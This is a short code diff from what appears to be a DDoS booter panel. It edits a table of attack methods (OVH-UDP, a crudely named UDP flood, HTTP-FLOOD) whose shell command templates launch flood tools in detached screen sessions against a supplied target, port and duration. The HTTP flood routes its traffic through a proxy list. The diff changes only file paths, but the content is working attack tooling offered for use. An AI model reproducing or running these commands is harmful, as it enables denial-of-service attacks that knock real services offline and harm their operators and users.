@@ -14,7 +14,7 @@ const METHODS = {
     "OVH-UDP": "screen -dmS %s ./methods/ovh-udp %s %i 4096 1 -1 %i",
     "UDP-RAPE": "screen -dmS %s ./methods/udp-rape %s %i 4096 1 -1 %i",
     "HTTP-FLOOD":
-        'screen -dmS %s node browser/storm.js --url "%s" --host "ujustgotrekt.lol:%i" --time %i --mode socket --skip true --engine false --proxy browser/proxies.txt',
+        'screen -dmS %s node methods/browser/storm.js --url "%s" --host "ujustgotrekt.lol:%i" --time %i --mode socket --skip true --engine false --proxy methods/browser/proxies.txt',
 }
 
 const ERRORS_TO_RETRY = [
